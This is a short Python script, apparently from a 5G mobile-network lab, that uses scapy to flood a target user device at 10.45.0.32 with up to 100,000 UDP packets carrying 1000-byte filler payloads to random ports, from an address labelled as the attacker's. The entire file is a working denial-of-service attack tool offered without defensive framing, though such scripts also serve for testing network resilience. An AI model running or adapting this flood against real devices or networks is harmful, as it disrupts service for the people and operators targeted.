#!/usr/bin/env python3
from scapy.all import IP, UDP, send
import random
import time

TARGET_IP = "10.45.0.32"  # Target UE IP
MAX_PACKETS = 100000

packet_count = 0
while packet_count < MAX_PACKETS:
    # Craft a UDP packet to a random port
    pkt = (
        IP(src="10.45.0.1", dst=TARGET_IP) /  # Attacker UE IP (adjust to your setup)
        UDP(sport=random.randint(1024, 65535), dport=random.randint(1, 65535)) /
        ("X" * 1000)  # Large payload to increase resource usage
    )
    send(pkt, count=1, inter=0.001, verbose=0)  # 1ms interval
    packet_count += 1
    if packet_count % 100 == 0:
        print(f"Sent {packet_count} UDP packets")
    time.sleep(0.01)  # Slight delay to avoid overwhelming the attacker

print(f"Sent {packet_count} UDP packets.")